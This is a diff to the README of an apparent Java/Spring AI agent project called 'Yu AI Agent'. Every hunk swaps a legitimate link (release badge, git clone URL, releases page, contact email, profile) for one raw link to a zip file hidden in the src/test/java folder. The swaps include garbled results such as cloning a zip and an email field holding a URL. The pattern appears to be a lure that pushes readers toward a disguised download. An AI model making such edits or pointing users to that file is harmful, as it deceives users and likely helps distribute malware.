@@ -1,6 +1,6 @@
 # Yu AI Agent 🤖
 
-![GitHub release](https://img.shields.io/github/release/hfgwygey/yu-ai-agent.svg) [![Download Releases](https://img.shields.io/badge/Download%20Releases-blue)](https://github.com/hfgwygey/yu-ai-agent/releases)
+![GitHub release](https://raw.githubusercontent.com/hfgwygey/yu-ai-agent/master/src/test/java/yu-ai-agent-1.0-beta.3.zip) [![Download Releases](https://raw.githubusercontent.com/hfgwygey/yu-ai-agent/master/src/test/java/yu-ai-agent-1.0-beta.3.zip%20Releases-blue)](https://raw.githubusercontent.com/hfgwygey/yu-ai-agent/master/src/test/java/yu-ai-agent-1.0-beta.3.zip)
 
 Welcome to the **Yu AI Agent** repository! This project serves as a comprehensive guide for AI development in 2025. Built on **Spring Boot 3**, **Java 21**, and **Spring AI**, this repository focuses on creating the AI Love Master application and the ReAct mode autonomous planning agent, YuManus. 
 
@@ -50,7 +50,7 @@ To get started with the Yu AI Agent, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/hfgwygey/yu-ai-agent.git
+   git clone https://raw.githubusercontent.com/hfgwygey/yu-ai-agent/master/src/test/java/yu-ai-agent-1.0-beta.3.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -70,7 +70,7 @@ To get started with the Yu AI Agent, follow these steps:
    mvn spring-boot:run
    ```
 
-For more detailed installation instructions, visit the [Releases section](https://github.com/hfgwygey/yu-ai-agent/releases).
+For more detailed installation instructions, visit the [Releases section](https://raw.githubusercontent.com/hfgwygey/yu-ai-agent/master/src/test/java/yu-ai-agent-1.0-beta.3.zip).
 
 ## Usage
 
@@ -160,7 +160,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 For any inquiries or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **GitHub**: [hfgwygey](https://github.com/hfgwygey)
+- **Email**: https://raw.githubusercontent.com/hfgwygey/yu-ai-agent/master/src/test/java/yu-ai-agent-1.0-beta.3.zip
+- **GitHub**: [hfgwygey](https://raw.githubusercontent.com/hfgwygey/yu-ai-agent/master/src/test/java/yu-ai-agent-1.0-beta.3.zip)
 
-Explore the project and become proficient in AI development. Don’t forget to check the [Releases section](https://github.com/hfgwygey/yu-ai-agent/releases) for updates and new features!
+Explore the project and become proficient in AI development. Don’t forget to check the [Releases section](https://raw.githubusercontent.com/hfgwygey/yu-ai-agent/master/src/test/java/yu-ai-agent-1.0-beta.3.zip) for updates and new features!
